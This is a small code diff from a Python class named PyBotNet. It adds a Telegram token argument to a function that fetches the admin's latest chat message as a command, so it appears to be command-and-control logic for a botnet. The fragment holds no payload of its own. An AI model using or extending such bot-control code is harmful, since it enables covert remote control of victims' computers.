@@ -59,7 +59,7 @@ class PyBotNet:
         # if message list not False > extract last message from admin > if last admin message not False return
         if messages_list:
             last_message = util.extract_last_admin_command(
-                messages_list, self.ADMIN_CHAT_ID, self.logger)
+                messages_list, self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN, self.logger)
 
             if last_message:
                 return last_message
